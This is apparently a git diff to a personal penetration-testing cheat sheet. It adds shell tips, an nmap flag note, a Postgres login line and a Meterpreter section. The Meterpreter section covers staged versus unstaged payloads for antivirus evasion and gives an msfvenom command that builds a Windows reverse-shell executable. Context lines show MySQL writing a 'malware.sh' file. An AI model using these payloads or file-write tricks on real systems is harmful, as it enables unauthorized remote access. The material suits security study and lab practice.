@@ -2,7 +2,7 @@
 ## General
 
 ```bash
-find . -type f -name "*.txt"
+find . -type f -name "*.db" 2>/dev/null
 #find all files with extension in current dir
 
 md5sum <filename> 
@@ -13,6 +13,21 @@ find / -type d -name '.git'
 
 cd /var/mail && cd /var/spool/mail
 #check for mail
+
+true && echo hi
+#hi will be echoed
+
+false && echo hi 
+#hi will not be echoed
+
+false/true & echo hi | false/true ; echo hi 
+#hi will always be echoed
+
+netstat -tulpn
+#lists all ports in use
+
+grep -i something
+#case insensitive search
 
 ```
 
@@ -51,6 +66,8 @@ Always google open ports, not just services shown/guessed by nmap
 
 gitdump used to dump .git directories 
 
+if nmap only shows scanning 2 ports with -p- use -Pn
+
 
 ## MySQL
 
@@ -68,6 +85,11 @@ mysql can usually write into /var/lib/mysql/
 SELECT "bashscript" into outfile '/dev/shm/malware.sh';
 
 SELECT from_base64("base64encoded") into outfile '/dev/shm/nothing.txt';
+
+## Postgres
+```bash
+psql -h <localhost> -U <username> 
+```
 
 
 ## RevShells
@@ -147,3 +169,18 @@ check /var/www, use ls -la. .env is common php password storage thingie
 https://beautifier.io/ - Use detect packers & obfuscators
 
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+with basic http auth (website shows popup asking for creds) you can clear prefixing url. ie http://username:password@url.com
+
+
+## Meterpreter
+
+Staged means normal rev shell. OS/meterpreter/reverse_tcp is staged. It's much smaller, but much more fingerprinted and hard to bypass AV
+
+Unstaged means special meterpreter shell. OS/meterpreter_reverse_tcp is unstaged. Pretty big (150+ KB) but can be obviscated much better
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=port -f <format> -o outfile.exe
+#payload creation made easy :)
+
+```
